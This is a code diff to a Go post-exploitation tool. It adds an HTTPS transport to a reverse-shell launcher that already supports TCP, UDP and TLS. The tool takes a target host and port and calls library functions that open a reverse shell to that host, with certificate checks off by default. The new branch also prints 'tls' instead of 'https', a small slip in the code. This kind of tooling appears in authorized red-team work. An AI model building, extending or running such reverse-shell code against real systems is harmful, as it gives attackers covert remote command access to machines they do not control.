@@ -15,7 +15,7 @@ func main() {
 	flag.Usage = usage
 	target := flag.String("t", "", "The target to connect to.")
 	port := flag.Int("p", 8080, "The port to connect to.")
-	protocol := flag.String("x", "tcp", "The protocol to connect with. Should be one of: 'tcp', 'udp' or 'tls'.")
+	protocol := flag.String("x", "tcp", "The protocol to connect with. Should be one of: 'tcp', 'udp', 'tls' or 'https'.")
 	verify := flag.Bool("v", false, "Specify this flag to enable certificate verification on TLS connections.")
 	flag.Parse()
 	//validate flags that require a value
@@ -34,6 +34,9 @@ func main() {
 		case "tls":
 			fmt.Println("Sending a present to", *target + ":" + strconv.Itoa(*port) + " using protocol 'tls'.")
 			postex.ReverseTCPShellTLS(filepath, *target, *port, !*verify)
+		case "https":
+			fmt.Println("Sending a present to", *target + ":" + strconv.Itoa(*port) + " using protocol 'tls'.")
+			postex.ReverseShellHTTPS(filepath, *target, *port, "/input", "/output", !*verify)
 		default:
 			usage()
 			return
